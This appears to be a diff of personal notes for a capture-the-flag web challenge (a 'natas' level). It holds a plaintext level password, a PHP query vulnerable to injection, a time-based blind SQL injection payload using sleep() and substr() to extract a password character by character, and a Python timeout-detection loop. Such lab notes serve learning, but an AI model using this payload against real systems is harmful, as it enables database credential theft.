@@ -1,1 +1,27 @@
 password 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+mysql conditional time delay
+SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') 
+
+query per page source
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
+
+translated to sql:
+SELECT * from users where username="[paylaod goes here]
+
+so we want our paylod to look like this:
+SELECT * from users where username="natas18" and if(ascii(substr(password,{},1))={},sleep(10),'a')
+which should theoretically add a 10s delay if the character in the password matches
+
+next we need to filter our True condition in python to check for the response time:
+if it's 10s then it's true, otherwise it's false
+this should greatly speed up our querying since there will be a lot more falses than trues.
+
+in this case, we need to use try: except: because if python requests times out, it throws an error.
+syntax looks like this:
+try: 
+    r = requests.post(url+payload, headers=headers, timeout=5)
+except requests.exceptions.ReadTimeout:
+    password+=chr(i)
+    print(chr(i), end='', flush=True)
+    break
